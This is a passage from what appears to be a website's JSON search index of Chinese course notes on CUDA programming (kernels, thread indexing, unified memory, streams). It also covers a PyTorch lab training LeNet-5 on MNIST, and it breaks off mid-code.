\u5173\u952e\u5b57\u5b9a\u4e49\u7684\u51fd\u6570\u9700\u8981\u8fd4\u56de <code>void</code> \u7c7b\u578b\u3002</li> </ul> <p><code>GPUFunction&lt;&lt;&lt;1, 1&gt;&gt;&gt;();</code></p> <ul> <li>\u901a\u5e38\uff0c\u5f53\u8c03\u7528\u8981\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u51fd\u6570\u65f6\uff0c\u5c06\u6b64\u79cd\u51fd\u6570\u79f0\u4e3a \u5df2\u542f\u52a8 \u7684 \u6838\u51fd\u6570 \u3002</li> <li>\u542f\u52a8\u6838\u51fd\u6570\u65f6\uff0c\u5fc5\u987b\u63d0\u4f9b \u6267\u884c\u914d\u7f6e \uff0c\u5373\u5728\u5411\u6838\u51fd\u6570\u4f20\u9012\u53c2\u6570\u4e4b\u524d\u4f7f\u7528 <code>&lt;&lt;&lt;number_of_blocks, threads_per_block&gt;&gt;&gt;</code> \u8bed\u6cd5\u5b8c\u6210\u914d\u7f6e\u3002</li> <li>\u5728\u5b8f\u89c2\u5c42\u9762\uff0c\u53ef\u901a\u8fc7\u6267\u884c\u914d\u7f6e\u4e3a\u6838\u51fd\u6570\u542f\u52a8\u6307\u5b9a \u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784 \uff0c\u4ece\u800c\u5b9a\u4e49\u7ebf\u7a0b\u7ec4\uff08\u79f0\u4e3a \u7ebf\u7a0b\u5757 \uff09\u7684\u6570\u91cf <code>number_of_blocks</code> \uff0c\u4ee5\u53ca\u8981\u5728\u6bcf\u4e2a\u7ebf\u7a0b\u5757\u4e2d\u6267\u884c\u7684 \u7ebf\u7a0b \u6570\u91cf <code>threads_per_block</code> \u3002\u5982\u6837\u4f8b\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528\u4e86\u5305\u542b <code>1</code> \u7ebf\u7a0b\u7684 <code>1</code> \u7ebf\u7a0b\u5757\u542f\u52a8\u6838\u51fd\u6570\u3002</li> </ul> <p><code>cudaDeviceSynchronize();</code></p> <ul> <li>\u6838\u51fd\u6570\u542f\u52a8\u65b9\u5f0f\u4e3a \u5f02\u6b65 \uff1aCPU \u4ee3\u7801\u5c06\u7ee7\u7eed\u6267\u884c\uff0c\u65e0\u9700\u7b49\u5f85\u6838\u51fd\u6570\u5b8c\u6210\u542f\u52a8\u3002</li> <li>\u8c03\u7528 CUDA \u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u51fd\u6570 <code>cudaDeviceSynchronize</code> \u4f7f\u5f97\u4e3b\u673a (CPU) \u4ee3\u7801\u6682\u4f5c\u7b49\u5f85\uff0c\u76f4\u81f3\u8bbe\u5907 (GPU) \u4ee3\u7801\u6267\u884c\u5b8c\u6210\uff0c\u624d\u80fd\u5728 CPU \u4e0a\u6062\u590d\u6267\u884c\u3002</li> </ul> <p>\u7f16\u8bd1\u8fd0\u884c CUDA \u52a0\u901f\u7a0b\u5e8f</p> <p>\u4f7f\u7528 <code>nvcc</code> \u547d\u4ee4\u7f16\u8bd1\u548c\u8fd0\u884c\u7a0b\u5e8f\uff1a</p> <pre><code>$ nvcc -arch=sm_70 -o hello-gpu hello-gpu.cu -run\n</code></pre> <ul> <li><code>nvcc</code> \u4e3a\u7f16\u8bd1\u5668\u547d\u4ee4\u3002</li> <li><code>-arch</code> \u9009\u9879\u6307\u5b9a\u67b6\u6784\u7c7b\u578b\u3002</li> <li><code>-o</code> \u6307\u5b9a\u7f16\u8bd1\u7a0b\u5e8f\u7684\u8f93\u51fa\u6587\u4ef6\u3002</li> <li><code>-run</code> \u6807\u5fd7\u6267\u884c\u6210\u529f\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</li> </ul>"},{"location":"hpc/hpc101/cuda/#cuda","title":"CUDA \u7ebf\u6027\u5c42\u6b21\u7ed3\u6784","text":"<p>\u542f\u52a8\u6838\u51fd\u6570\u65f6\uff0c\u6838\u51fd\u6570\u4ee3\u7801\u7531\u6bcf\u4e2a\u5df2\u914d\u7f6e\u7684\u7ebf\u7a0b\u5757\u4e2d\u7684\u6bcf\u4e2a\u7ebf\u7a0b\u6267\u884c\u3002</p> <p>CUDA \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf\uff1a</p> <ul> <li><code>gridDim.x</code> \u7f51\u683c\u4e2d\u5757\u6570\uff1b<code>blockDim.x</code> \u6bcf\u5757\u4e2d\u7ebf\u7a0b\u6570\u3002</li> <li><code>blockIdx.x</code> \u5f53\u524d\u7ebf\u7a0b\u6240\u5728\u7ebf\u7a0b\u5757\u7d22\u5f15\uff1b<code>threadIdx.x</code> \u5f53\u524d\u7ebf\u7a0b\u5728\u7ebf\u7a0b\u5757\u4e2d\u7684\u7d22\u5f15\u3002</li> </ul>"},{"location":"hpc/hpc101/cuda/#_3","title":"\u52a0\u901f\u5faa\u73af","text":"<p>\u6b65\u9aa4\uff1a</p> <ul> <li>\u5fc5\u987b\u7f16\u5199\u5b8c\u6210 \u5faa\u73af\u7684\u5355\u6b21\u8fed\u4ee3 \u5de5\u4f5c\u7684\u6838\u51fd\u6570\u3002</li> <li>\u7531\u4e8e\u6838\u51fd\u6570\u4e0e\u5176\u4ed6\u6b63\u5728\u8fd0\u884c\u7684\u6838\u51fd\u6570\u65e0\u5173\uff0c\u56e0\u6b64\u6267\u884c\u914d\u7f6e\u5fc5\u987b\u4f7f\u6838\u51fd\u6570\u6267\u884c\u6b63\u786e\u7684\u6b21\u6570\uff0c\u4f8b\u5982\u5faa\u73af\u8fed\u4ee3\u7684\u6b21\u6570\u3002\uff08\u6ce8\u610f\uff1a\u5404\u4e2a\u7ebf\u7a0b\u6267\u884c\u987a\u5e8f\u4e0d\u5b9a\uff0c\u6545\u53ef\u52a0\u901f\u7684\u5faa\u73af\u9700\u8981\u5404\u6b21\u8fed\u4ee3\u65e0\u5173\u8054\u4e14\u987a\u5e8f\u65e0\u5f71\u54cd\uff09</li> </ul> <p>\u4f8b\u5b50\uff1a</p> <p>\u52a0\u901f\u524d\uff1a</p> <pre><code>for (int i = 0; i &lt; N; ++i)\n{\n  printf(\"%d\\n\", i);\n}\n</code></pre> <p>\u52a0\u901f\u540e\uff1a\u4f7f\u7528\u6838\u51fd\u6570\u5b9e\u73b0\u5355\u8bcd\u8fed\u4ee3</p> <pre><code>__global__ void loop() {\n    int idx = threadIdx.x + blockIdx.x * blockDim.x;\n    if (idx &lt; N)\n        printf(\"%d\\n\", idx);\n}\n</code></pre> <p>\u5e76\u8c03\u7528</p> <pre><code>loop&lt;&lt;&lt;number_of_blocks, threads_per_block&gt;&gt;&gt;();\n</code></pre> <p>\u6b64\u5904\u5fc5\u987b\u6709 <code>number_of_blocks * threads_per_block &gt;= N</code> \u3002</p>"},{"location":"hpc/hpc101/cuda/#_4","title":"\u5206\u914d\u5185\u5b58","text":"<p>\u56de\u5fc6\u4e00\u822c\u7684 CPU \u7a0b\u5e8f\u5206\u914d\u5e76\u91ca\u653e\u5185\u5b58\u7684\u65b9\u5f0f\uff1a</p> <pre><code>int *a;\na = (int *)malloc(size);\n...\nfree(a);\n</code></pre> <p>\u8981\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\uff0c\u5e76\u83b7\u53d6\u53ef\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4ee3\u7801\u4e2d\u5f15\u7528\u7684\u6307\u9488\uff0c\u5219\u9700\u8981\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684\u51fd\u6570 <code>cudaMallocManaged()</code> \u548c <code>cudaFree()</code> \uff1a</p> <pre><code>int *a;\ncudaMallocManaged(&amp;a, size);\n...\ncudaFree(a);\n</code></pre> <p>\u5176\u4ed6\u4e00\u4e9b\u7528\u4e8e\u624b\u52a8\u5185\u5b58\u7ba1\u7406\u7684 CUDA \u547d\u4ee4\uff1a</p> <ul> <li><code>cudaMalloc</code> \u547d\u4ee4\u5c06\u76f4\u63a5\u4e3a\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684 GPU \u5206\u914d\u5185\u5b58\u3002\u8fd9\u53ef\u9632\u6b62\u51fa\u73b0\u6240\u6709 GPU \u5206\u9875\u9519\u8bef\uff0c\u800c\u4ee3\u4ef7\u662f\u4e3b\u673a\u4ee3\u7801\u5c06\u65e0\u6cd5\u8bbf\u95ee\u8be5\u547d\u4ee4\u8fd4\u56de\u7684\u6307\u9488\u3002</li> <li><code>cudaMallocHost</code> \u547d\u4ee4\u5c06\u76f4\u63a5\u4e3a CPU \u5206\u914d\u5185\u5b58\u3002\u8be5\u547d\u4ee4\u53ef\u56fa\u5b9a\u5185\u5b58\uff08pinned memory\uff09\u6216\u9875\u9501\u5b9a\u5185\u5b58\uff08page-locked memory\uff09\u3002\u5141\u8bb8\u5c06\u5185\u5b58\u5f02\u6b65\u62f7\u8d1d\u81f3 GPU \u6216\u4ece GPU \u5f02\u6b65\u62f7\u8d1d\u81f3\u5185\u5b58\u3002\u4f46\u56fa\u5b9a\u5185\u5b58\u8fc7\u591a\u4f1a\u5e72\u6270 CPU \u6027\u80fd\uff0c\u56e0\u6b64\u9700\u907f\u514d\u65e0\u7aef\u4f7f\u7528\u8be5\u547d\u4ee4\u3002\u91ca\u653e\u56fa\u5b9a\u5185\u5b58\u65f6\u5e94\u4f7f\u7528 <code>cudaFreeHost</code> \u547d\u4ee4\u3002</li> <li><code>cudaMemcpy</code> \u547d\u4ee4\u53ef\u62f7\u8d1d\u5185\u5b58\u3002\u793a\u4f8b   <pre><code>// \u4ece host \u5411 device \u62f7\u8d1d\u5185\u5b58\ncudaMemcpy(device_a, host_a, size, cudaMemcpyHostToDevice);\n// \u4ece device \u5411 host \u62f7\u8d1d\u5185\u5b58\ncudaMemcpy(host_a, device_a, size, cudaMemcpyDeviceToHost);\n</code></pre></li> </ul>"},{"location":"hpc/hpc101/cuda/#_5","title":"\u8de8\u7f51\u683c\u5faa\u73af","text":"<p>\u5f53\u6570\u636e\u96c6\u6bd4\u7f51\u683c\u5927\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u6bcf\u4e2a\u7ebf\u7a0b\u5904\u7406\u591a\u4e2a\u6570\u636e\uff1a</p> <pre><code>__global__ void kernel(int *a, int N)\n{\n  int idx = threadIdx.x + blockIdx.x * blockDim.x;\n  int stride = gridDim.x * blockDim.x;\n\n  for (int i = idx; i &lt; N; i += stride)\n  {\n    // do work on a[i];\n  }\n}\n</code></pre>"},{"location":"hpc/hpc101/cuda/#_6","title":"\u9519\u8bef\u5904\u7406","text":"<ul> <li>\u8bb8\u591a CUDA \u51fd\u6570\u4f1a\u8fd4\u56de\u7c7b\u578b\u4e3a <code>cudaError_t</code> \u7684\u503c\uff0c\u53ef\u7528\u4e8e\u68c0\u67e5\u8c03\u7528\u662f\u5426\u51fa\u9519\u3002</li> <li>\u4e3a\u68c0\u67e5\u542f\u52a8\u6838\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u9519\u8bef\uff0cCUDA \u63d0\u4f9b\u4e86 <code>cudaGetLastError</code> \u51fd\u6570\uff0c\u8fd4\u56de\u7c7b\u578b\u4e3a <code>cudaError_t</code> \u7684\u503c\u3002</li> <li>\u4e3a\u6355\u6349\u5f02\u6b65\u9519\u8bef\uff08\u4f8b\u5982\uff0c\u5728\u5f02\u6b65\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\uff09\uff0c\u9700\u8981\u68c0\u67e5\u540e\u7eed\u540c\u6b65 CUDA \u8fd0\u884c\u65f6 API \u8c03\u7528\u6240\u8fd4\u56de\u7684\u72b6\u6001\uff08\u4f8b\u5982 <code>cudaDeviceSynchronize</code> \uff09\uff0c\u5982\u679c\u4e4b\u524d\u542f\u52a8\u7684\u5176\u4e2d\u4e00\u4e2a\u6838\u51fd\u6570\u5931\u8d25\uff0c\u5219\u5c06\u8fd4\u56de\u9519\u8bef\u3002</li> </ul> <p>\u9519\u8bef\u5927\u81f4\u53ef\u5206\u4e3a\u540c\u6b65\u9519\u8bef <code>synError</code> \u548c\u5f02\u6b65\u9519\u8bef <code>asynError</code> \u3002</p> <p>\u5bf9\u4e8e <code>cudaError_t</code> \u503c\uff0c\u5c06\u5176\u4e0e CUDA \u63d0\u4f9b\u7684 <code>cudaSuccess</code> \u8fdb\u884c\u6bd4\u8f83\uff0c\u5373\u53ef\u5224\u65ad\u662f\u5426\u51fa\u9519\uff0c\u540c\u65f6\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570 <code>cudaGetErrorString()</code> \u83b7\u5f97\u9519\u8bef\u4fe1\u606f\u3002</p> <p>\u4e00\u4e2a\u5305\u88c5 CUDA \u51fd\u6570\u8c03\u7528\u7684\u5b8f\uff1a</p> <pre><code>inline cudaError_t checkCuda(cudaError_t result)\n{\n  if (result != cudaSuccess) {\n    fprintf(stderr, \"CUDA Runtime Error: %s\\n\", cudaGetErrorString(result));\n    assets(result == cudaSuccess);\n  }\n  return result;\n}\n\nint main()\n{\n\n/*\n * The macro can be wrapped around any function returning\n * a value of type `cudaError_t`.\n */\n\n  checkCuda( cudaDeviceSynchronize() )\n}\n</code></pre>"},{"location":"hpc/hpc101/cuda/#-","title":"\u8fdb\u9636\u5185\u5bb9 - \u591a\u7ef4\u7f51\u683c\u548c\u5757","text":"<p>\u53ef\u4ee5\u5c06\u7f51\u683c\u548c\u7ebf\u7a0b\u5757\u5b9a\u4e49\u4e3a\u6700\u591a\u5177\u6709 3 \u4e2a\u7ef4\u5ea6\uff0c CUDA \u63d0\u4f9b <code>dim3</code> \u7c7b\u578b\u5b9a\u4e49\u591a\u7ef4\u7f51\u683c\u548c\u5757\uff1a</p> <pre><code>dim3 threads_per_block(block_dim_x, block_dim_y, block_dim_z);\ndim3 number_of_blocks(grid_dim_x, grid_dim_y, grid_dim_z);\nsomeKernel&lt;&lt;&lt;number_of_blocks, threads_per_block&gt;&gt;&gt;();\n</code></pre> <p>\u5728\u6838\u51fd\u6570\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>threadIdx.y</code> \u53ca\u7c7b\u4f3c\u5f62\u5f0f\u83b7\u5f97\u76f8\u5173\u7d22\u5f15\u548c\u7ef4\u5ea6\u3002</p>"},{"location":"hpc/hpc101/cuda/#nsys","title":"\u7edf\u4e00\u5185\u5b58\u4f7f\u7528\u4e0e\u4f7f\u7528 nsys \u7ba1\u7406\u5185\u5b58","text":""},{"location":"hpc/hpc101/cuda/#nsys_1","title":"nsys \u4f7f\u7528","text":"<p>\u4f7f\u7528 <code>nsys profile</code> \u5206\u6790\u7f16\u8bd1\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6</p> <pre><code>$ nsys profile --stats=true ./test\n</code></pre> <p><code>nsys profile</code> \u5c06\u751f\u6210\u4e00\u4e2a <code>qdrep</code> \u62a5\u544a\u6587\u4ef6\uff0c\u4f7f\u7528 <code>--stats = true</code> \u6807\u5fd7\u8868\u793a\u5e0c\u671b\u6253\u5370\u8f93\u51fa\u6458\u8981\u7edf\u8ba1\u4fe1\u606f\u3002</p>"},{"location":"hpc/hpc101/cuda/#streaming-multiprocessors","title":"\u6d41\u591a\u5904\u7406\u5668\uff08Streaming Multiprocessors\uff09","text":"<p>GPU \u5177\u6709\u79f0\u4e3a\u6d41\u591a\u5904\u7406\u5668\uff08\u6216 SM\uff09\u7684\u5904\u7406\u5355\u5143\u3002\u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\uff0c\u5c06\u7ebf\u7a0b\u5757\u63d0\u4f9b\u7ed9 SM \u4ee5\u4f9b\u5176\u6267\u884c\u3002SM \u540c\u65f6\u8c03\u5ea6\u6267\u884c\u7684\u7ebf\u7a0b\u5757\u53d6\u51b3\u4e8e warp \u5927\u5c0f\uff08\u4e00\u822c\u4e3a 32\uff09\u3002</p> <p>\u901a\u5e38\u53ef\u4ee5\u9009\u62e9\u7ebf\u7a0b\u6570\u91cf\u6570\u500d\u4e8e 32 \u7684\u7ebf\u7a0b\u5757\u5927\u5c0f\u6765\u63d0\u5347\u6027\u80fd\u3002</p>"},{"location":"hpc/hpc101/cuda/#gpu_3","title":"\u67e5\u8be2 GPU \u5c5e\u6027","text":"<pre><code>int deviceId;\ncudaGetDevice(&amp;deviceId);\n\ncudaDeviceProp props;\ncudaGetDeviceProperties(&amp;props, deviceId);\n</code></pre> <p><code>props</code> \u4e2d\u5305\u542b\u4e86 GPU \u8bbe\u5907\u5c5e\u6027\uff0c\u4e3b\u8981\u7528\u5230 warp \u5927\u5c0f <code>props.warpSize</code> \u3002</p>"},{"location":"hpc/hpc101/cuda/#um","title":"\u7edf\u4e00\u5185\u5b58\uff08UM\uff09\u884c\u4e3a","text":"<p>\u5206\u914d UM \u65f6\uff0c\u5185\u5b58\u5c1a\u672a\u9a7b\u7559\u5728\u4e3b\u673a\u6216\u8bbe\u5907\u4e0a\u3002\u4e3b\u673a\u6216\u8bbe\u5907\u5c1d\u8bd5\u8bbf\u95ee\u5185\u5b58\u65f6\u4f1a\u53d1\u751f\u9875\u9519\u8bef\uff08Page Fault\uff09\uff0c\u6b64\u65f6\u4e3b\u673a\u6216\u8bbe\u5907\u4f1a\u6279\u91cf\u8fc1\u79fb\u6240\u9700\u7684\u6570\u636e\u3002\u540c\u7406\uff0c\u5f53 CPU \u6216\u52a0\u901f\u7cfb\u7edf\u4e2d\u7684\u4efb\u4f55 GPU \u5c1d\u8bd5\u8bbf\u95ee\u5c1a\u672a\u9a7b\u7559\u5728\u5176\u4e0a\u7684\u5185\u5b58\u65f6\uff0c\u4f1a\u53d1\u751f\u9875\u9519\u8bef\u5e76\u89e6\u53d1\u8fc1\u79fb\u3002</p> <p>\u7a00\u758f\u8bbf\u95ee\u6570\u636e\u65f6\uff0c\u89e6\u53d1\u9875\u9519\u8bef\u5e76\u6309\u9700\u8fc1\u79fb\u5185\u5b58\u4f1a\u6709\u663e\u8457\u4f18\u52bf\u3002</p> <p>\u800c\u9700\u8981\u5927\u91cf\u8fde\u7eed\u7684\u5185\u5b58\u5757\u65f6\uff0c\u901a\u8fc7\u5f02\u6b65\u9884\u53d6\u5185\u5b58\u53ef\u4ee5\u6709\u6548\u89c4\u907f\u9875\u9519\u8bef\u548c\u6309\u9700\u6570\u636e\u8fc1\u79fb\u6240\u4ea7\u751f\u7684\u5f00\u9500\u3002</p>"},{"location":"hpc/hpc101/cuda/#_7","title":"\u5f02\u6b65\u5185\u5b58\u9884\u53d6","text":"<p>CUDA \u53ef\u901a\u8fc7 <code>cudaMemPrefetchAsync</code> \u51fd\u6570\uff0c\u5c06\u6258\u7ba1\u5185\u5b58\u5f02\u6b65\u9884\u53d6\u5230 GPU \u8bbe\u5907\u6216 CPU\uff1a</p> <pre><code>int deviceId;\ncudaGetDevice(&amp;deviceId);\n\n// Prefetch to GPU device.\ncudaMemPrefetchAsync(pointerToSomeUMData, size, deviceId);\n// Prefetch to host.\ncudaMemPrefetchAsync(pointerToSomeUMData, size, cudaCpuDeviceId); \n</code></pre>"},{"location":"hpc/hpc101/cuda/#cuda_1","title":"\u5e76\u53d1 CUDA \u6d41","text":"<p>\u6d41\u662f\u7531\u6309\u987a\u5e8f\u6267\u884c\u7684\u4e00\u7cfb\u5217\u547d\u4ee4\u6784\u6210\u3002\u5728 CUDA \u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6838\u51fd\u6570\u7684\u6267\u884c\u4ee5\u53ca\u4e00\u4e9b\u5185\u5b58\u4f20\u8f93\u5747\u5728 CUDA \u6d41\u4e2d\u8fdb\u884c\u3002\u672a\u4f5c\u7279\u6b8a\u58f0\u660e\u7684\u6838\u51fd\u6570\u5728\u9ed8\u8ba4\u6d41\u4e2d\u6267\u884c\u3002</p> <p>\u6b64\u5916\uff0c\u7a0b\u5e8f\u53ef\u4ee5\u521b\u5efa\u975e\u9ed8\u8ba4\u6d41\uff0c\u5728\u4e0d\u540c\u7684\u6d41\u4e2d\u5e76\u53d1\u6267\u884c\u591a\u4e2a\u6838\u51fd\u6570\u3002</p> <p>\u9ed8\u8ba4\u6d41\u4f1a\u963b\u6b62\u5176\u4ed6\u6d41\u4e2d\u7684\u6240\u6709\u6838\u51fd\u6570\u3002\u5f53\u5176\u4ed6\u6d41\u4e2d\u7684\u6240\u6709\u6838\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\u4e4b\u540e\uff0c\u9ed8\u8ba4\u6d41\u4e2d\u7684\u6838\u51fd\u6570\u624d\u5f00\u59cb\u6267\u884c\uff1b\u5f53\u9ed8\u8ba4\u6d41\u4e2d\u7684\u6838\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\uff0c\u5176\u4ed6\u6d41\u4e2d\u7684\u6838\u51fd\u6570\u624d\u53ef\u4ee5\u5f00\u59cb\u6267\u884c\u3002</p> <p></p> <p>\u521b\u5efa\u975e\u9ed8\u8ba4\u6d41\uff0c\u5e76\u5728\u975e\u9ed8\u8ba4\u6d41\u4e2d\u542f\u52a8\u6838\u51fd\u6570\uff1a</p> <pre><code>cudaStream_t stream;\ncudaStreamCreate(&amp;stream);\n\nsomeKernel&lt;&lt;&lt;number_of_blocks, threads_per_block, 0, stream&gt;&gt;&gt;();\n\ncudaStreamDestroy(stream);\n</code></pre>"},{"location":"labs/cnn/","title":"lab5 \u7b80\u5355\u795e\u7ecf\u7f51\u7edc\u8bad\u7ec3\u4e0e\u52a0\u901f","text":""},{"location":"labs/cnn/#_1","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":"<p>\u8be5\u90e8\u5206\u5b8c\u6574\u4ee3\u7801\u4f4d\u4e8e <code>./code/letnet5.py</code></p>"},{"location":"labs/cnn/#_2","title":"\u6570\u636e\u96c6\u5bfc\u5165\u4e0e\u52a0\u8f7d","text":"<p>\u4f7f\u7528 <code>torchvision.datasets.MNIST</code> \u5bfc\u5165\u6570\u636e\u3002</p> <p>\u5176\u4e2d\u4f7f\u7528 <code>torchvision.transforms.ToTensor()</code> \u5c06 PIL image \u8f6c\u6362\u4e3a Tensor \u3002</p> <pre><code># Load MNIST\ntrain_dataset = torchvision.datasets.MNIST('./data', \n                    train=True, \n                    transform=torchvision.transforms.ToTensor(), \n                    target_transform=None, \n                    download=True)\ntest_dataset =  torchvision.datasets.MNIST('./data', \n                    train=False, \n                    transform=torchvision.transforms.ToTensor(), \n                    target_transform=None, \n                    download=True)\n</code></pre> <p>\u4f7f\u7528 <code>torch.utils.data.DataLoader</code> \u52a0\u8f7d\u6570\u636e\uff0c<code>batch_size=64</code> \u8bbe\u7f6e\u4e00\u6b21\u8bad\u7ec3\u53ca\u6d4b\u8bd5\u6293\u53d6\u7684\u6570\u636e\u6837\u672c\u6570\u91cf\u4e3a 64 \uff0c\u5e76\u4e14\u8bad\u7ec3\u65f6\u5c06\u6570\u636e\u6253\u4e71\u3002</p> <pre><code># Data Loader\ntrain_loader = torch.utils.data.DataLoader(train_dataset, \n                    batch_size=64, shuffle=True)\ntest_loader = torch.utils.data.DataLoader(test_dataset, \n                    batch_size=64, shuffle=False)\n</code></pre>"},{"location":"labs/cnn/#_3","title":"\u6a21\u578b\u7f16\u5199","text":""},{"location":"labs/cnn/#_4","title":"\u7f51\u7edc\u7ed3\u6784","text":"<p>\u7ee7\u627f <code>torch.nn.Module</code> \u5b9a\u4e49\u6a21\u578b\uff0c\u5c06\u7f51\u7edc\u7ed3\u6784\u4ee5\u7c7b\u4fdd\u5b58\u3002</p> <p>\u6839\u636e LetNet-5 \u7684\u7ed3\u6784\uff0c\u5b9a\u4e49\u6a21\u578b\u4e2d\u5404\u4e2a\u5c42\u3002</p> <pre><code>import torch.nn as nn\nimport torch.nn.functional as F\n\nclass LeNet_5(nn.Module):\n    def __init__(self):\n        super(LeNet_5, self).__init__()\n        # \u5377\u79ef\u5c42\n        self.conv1 = nn.Conv2d(1, 6, 5, stride=1)   \n        self.conv2 = nn.Conv2d(6, 16, 5, stride=1)\n        # \u6c60\u5316\u5c42\n        self.pool = nn.AvgPool2d(2, stride=2)\n        # \u5168\u8fde\u63a5\u5c42\n        self.full1 = nn.Linear(16 * 4 * 4, 120)\n        self.full2 = nn.Linear(120, 84)\n        self.full3 = nn.Linear(84, 10)\n    def forward(self, x):\n        x = F.gelu(self.conv1(x))\n        x = F.gelu(self.pool(x))\n        x = F.gelu(self.conv2(x))\n        x = F.gelu(self.pool(x))\n        x = x.view(-1, 16 * 4 * 4) # \u5f97\u5230\u4e00\u7ef4\u5411\u91cf\n        x = F.gelu(self.full1(x))\n        x = F.gelu(self.full2(x))\n        x = self.full3(x)\n        return x\n</code></pre>"},{"location":"labs/cnn/#_5","title":"\u635f\u5931\u51fd\u6570\u53ca\u4f18\u5316\u5668","text":"<p>\u635f\u5931\u51fd\u6570\u4f7f\u7528\u4ea4\u53c9\u71b5\u635f\u5931\u51fd\u6570 <code>torch.nn.CrossEntropyLoss()</code> \u3002</p> <p>\u4f7f\u7528 NAdam \u4f18\u5316\u5668\uff0c\u7ecf\u591a\u6b21\u6d4b\u8bd5\uff0c\u9009\u7528 \\(3 \\times 10^{-3}\\) \u7684\u5b66\u4e60\u7387\u3002</p> <pre><code>criterion = nn.CrossEntropyLoss()\noptimizer = torch.optim.NAdam(model.parameters(), lr=3e-3)\n</code></pre>"},{"location":"labs/cnn/#_6","title":"\u624b\u52a8\u8fc1\u79fb\u6a21\u578b\u53ca\u6570\u636e","text":"<p>\u5b9a\u4e49 <code>device</code> \u53d8\u91cf\uff0c\u5c06\u6a21\u578b\u548c\u6570\u636e\u8fc1\u79fb\u81f3 GPU \uff0c\u82e5\u65e0 GPU \u53ef\u7528\uff0c\u5219\u8fc1\u79fb\u81f3 CPU \u8bad\u7ec3\u3002</p> <pre><code>device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\nmodel = model.to(device)\n</code></pre>"},{"location":"labs/cnn/#_7","title":"\u8bad\u7ec3\u8fc7\u7a0b","text":"<p>\u603b\u5171\u5728\u8bad\u7ec3\u96c6\u4e0a\u8fdb\u884c\u5341\u6b21\u8bad\u7ec3\uff0c\u6bcf\u6b21\u8bad\u7ec3\u65f6\u4e0d\u65ad\u4ece <code>Dataloader</code> \u4e2d\u53d6\u51fa\u6570\u636e\uff0c\u5e76\u4e14\u8f93\u51fa\u6bcf\u6b21\u8bad\u7ec3\u7684\u5e73\u5747\u635f\u5931\u3002</p> <pre><code>model.train()\n\nrunning_loss = 0.0\nfor batch_idx, (images, labels) in enumerate(train_loader):\n    # \u53d6\u51fa\u6570\u636e\uff0c\u5c06\u6570\u636e\u8fc1\u79fb\u81f3 device\n    images, labels = images.to(device), labels.to(device)\n    # \u5bf9\u6570\u636e\u8fdb\u884c\u6b63\u5411\u4f20\u64ad\n    outputs = model(images)\n    # \u4f7f\u7528\u635f\u5931\u51fd\u6570\u8ba1\u7b97\u8be5\u6b21\u8bad\u7ec3\u7684\u635f\u5931\n    loss = criterion(outputs, labels)\n    # \u53cd\u5411\u4f20\u64ad\u524d\u5c06\u68af\u5ea6\u6e05\u96f6\n    optimizer.zero_grad(set_to_none=True)\n    # \u53cd\u5411\u4f20\u64ad\n    loss.backward()\n    # \u53cd\u5411\u4f20\u64ad\u540e\u66f4\u65b0\u4f18\u5316\u5668\u53c2\u6570\n    optimizer.step()\n    # \u7edf\u8ba1\u635f\u5931\n    running_loss += loss.item()\n# \u8f93\u51fa\u5e73\u5747\u635f\u5931\nprint('Epoch: [{}], Average Loss: {:.6f}'.format(epoch + 1, \n                            running_loss / len(train_loader)))\n</code></pre>"},{"location":"labs/cnn/#_8","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":"<p>\u6bcf\u6b21\u8bad\u7ec3\u7ed3\u675f\u4e4b\u540e\uff0c\u8fdb\u884c\u4e00\u6b21\u6d4b\u8bd5\u3002\u8f93\u51fa\u6bcf\u6b21\u8bad\u7ec3\u4e4b\u540e\u7684\u51c6\u786e\u5ea6\u3002</p> <pre><code>model.eval()\n# \u7981\u7528\u68af\u5ea6\u8ba1\u7b97\nwith torch.no_grad():\n    corret = 0\n    total = 0\n    for batch_idx, (images, labels) in enumerate(test_loader):\n        # \u53d6\u51fa\u6570\u636e\uff0c\u5c06\u6570\u636e\u8fc1\u79fb\u81f3 device\n        images, labels = images.to(device), labels.to(device)\n        # \u5bf9\u6570\u636e\u8fdb\u884c\u6b63\u5411\u4f20\u64ad\n        outputs = model(images)\n        # \u8fd4\u56de\u6bcf\u4e00\u884c\u6700\u5927\u503c\u53ca\u5176\u7d22\u5f15\uff0c\u5373\u9884\u6d4b\u7ed3\u679c\n        predict, result = torch.max(outputs.data, 1)\n        # \u7d2f\u52a0\u6d4b\u8bd5\u6570\u636e\u6570\u91cf\n        total += labels.size(0) \n        # \u7d2f\u52a0\u9884\u6d4b\u6b63\u786e\u7684\u6570\u636e\u6570\u91cf\n        corret += (result == labels).sum().item()\n    # \u8f93\u51fa\u51c6\u786e\u7387\n    print('Test Accuracy: {:.2f}%'.format(100 * corret / total))\n</code></pre>"},{"location":"labs/cnn/#gpu","title":"GPU \u5360\u7528\u7387","text":"<p>\u4f7f\u7528 <code>nvidia-smi</code> \u67e5\u770b GPU \u5360\u7528\u7387\u5982\u56fe\u3002</p> <p></p>"},{"location":"labs/cnn/#tensorboard","title":"\u4f7f\u7528 Tensorboard","text":"<p>\u4f7f\u7528 Tensorboard \u8bb0\u5f55\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u7684\u635f\u5931\u548c\u51c6\u786e\u7387\u3002</p> <pre><code>from torch.utils.tensorboard import SummaryWriter\n\nwriter = SummaryWriter()\n...\nfor epoch in range(10):\n    ...\n    for batch_idx, (images, labels) in 